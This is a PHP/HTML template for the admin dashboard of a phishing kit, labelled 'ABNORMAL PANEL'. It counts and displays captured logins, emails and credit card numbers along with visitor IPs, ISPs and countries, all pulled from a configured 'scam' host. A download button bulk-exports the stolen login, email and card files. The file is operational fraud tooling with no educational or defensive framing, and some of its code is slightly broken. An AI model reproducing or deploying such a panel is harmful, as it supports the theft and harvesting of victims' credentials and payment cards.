<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ABNORMAL PANEL</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
        }

        .container {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
        }

        .card {
            background-color: #2a2a2a;
            border: none;
        }

        .card .card-body {
            color: #ffffff;
        }

        .card.shadow-sm {
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }

        .btn {
            background-color: #6200ea;
            color: #ffffff;
            border: none;
        }

        .btn:hover {
            background-color: #3700b3;
        }

        table.dataTable {
            background-color: #2a2a2a;
            color: #ffffff;
        }

        table.dataTable thead {
            background-color: #333333;
            color: #ffffff;
        }

        table.dataTable tbody tr {
            background-color: #1e1e1e;
        }

        table.dataTable tbody tr:hover {
            background-color: #292929;
        }

        table.dataTable th, table.dataTable td {
            border-color: #444444;
        }

        a {
            color: #bb86fc;
        }

        a:hover {
            color: #bb86fc;
            text-decoration: underline;
        }
    </style>
</head>

<body>
<div class="container my-5">
    <h1 class="text-center mb-4">ABNORMAL PANEL</h1>
    <div class="row">
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-mouse-pointer fa-2x text-primary me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">Click</h6>
                        <h4 class="card-text" id="click"><?= $click; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-user-check fa-2x text-success me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">Login</h6>
                        <h4 class="card-text" id="login"><?= $login; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-envelope fa-2x text-warning me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">Email</h6>
                        <h4 class="card-text" id="email"><?= $email; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-credit-card fa-2x text-danger me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">Credit Cards</h6>
                        <h4 class="card-text" id="cc"><?= $cc; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-robot fa-2x text-info me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">BOT</h6>
                        <h4 class="card-text" id="bot"><?= $bot; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4 mb-4">
            <div class="card shadow-sm border-0">
                <div class="card-body d-flex align-items-center">
                    <i class="fa-solid fa-users fa-2x text-secondary me-3"></i>
                    <div>
                        <h6 class="card-title mb-0">Visitor</h6>
                        <h4 class="card-text" id="visitor"><?= $visitor_count; ?></h4>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="card mt-4">
        <div class="card-header">
            <h5 class="card-title mb-0 text-white mb-3">Visitor Data</h5>
            <button id="downloadVisitorData" class="btn btn-primary mb-2">
                <i class="fa-solid fa-download"></i> Download Data
            </button>
        </div>
        <div class="card-body">
            <table id="visitorTable" class="table table-striped table-bordered" style="width:100%">
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>OS/Browser</th>
                        <th>Useragent</th>
                        <th>ISP</th>
                        <th>Country</th>
                        <th>Activity</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if (!empty($visitor[0])) {
                        $reversed_visitor = array_reverse($visitor);
                        foreach ($reversed_visitor as $visitor_data) {
                            $visitor_data = explode("|", $visitor_data);
                            echo "<tr>";
                            foreach ($visitor_data as $visitor_datas) {
                                echo "<td>$visitor_datas</td>";
                            }
                            echo "</tr>";
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
<script>
$(document).ready(function () {
    // $('#visitorTable').DataTable();

    const types = ['click', 'login', 'email', 'cc', 'bot', 'visitor'];
    types.forEach(type => fetchData(type));

    // setInterval(() => {
    //     types.forEach(type => fetchData(type));
    // }, 30000);

    $('#downloadVisitorData').click(function () {
        const urls = [
            '<?= $setting['scam']; ?>/gacorking/login-<?= $setting['file'] ?>',
            '<?= $setting['scam']; ?>/gacorking/email-<?= $setting['file'] ?>',
            '<?= $setting['scam']; ?>/gacorking/cc-<?= $setting['file'] ?>'
        ];

        urls.forEach(url => {
            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Failed to fetch data from ${url}`);
                    }
                    return response.text();
                })
                .then(text => {
                    const fileName = url.split('/').pop();
                    const blob = new Blob([text], { type: 'text/plain' });
                    const downloadLink = document.createElement('a');
                    const objectUrl = URL.createObjectURL(blob);

                    downloadLink.href = objectUrl;
                    downloadLink.download = fileName;
                    document.body.appendChild(downloadLink);
                    downloadLink.click();
                    document.body.removeChild(downloadLink);

                    URL.revokeObjectURL(objectUrl);
                })
                .catch(error => {
                    console.error('Download failed:', error);
                });
        });
    });

    function fetchData(tipe) {
        $.ajax({
            url: '<?= $setting['scam']; ?>/gacorking/'+tipe+'.txt',
            method: 'GET',
            success: function (response) {
                if (tipe === 'visitor') {
                    updateVisitorTable(response);
                }
                const lines = response.split('\n').filter(line => line.trim() !== '');
                const totalLines = lines.length;
                $('#'+tipe).text(totalLines);
            },
            error: function () {
                console.log('Failed to get data from scam!');
            }
        });
    }

    function updateVisitorTable(data) {
        visitorTable.clear();

        const rows = data.split('\n').filter(row => row.trim() !== '');
        rows.forEach(row => {
            const columns = row.split('|');
            visitorTable.row.add(columns).draw(false);
        });
    }
});
</script>
</body>

</html>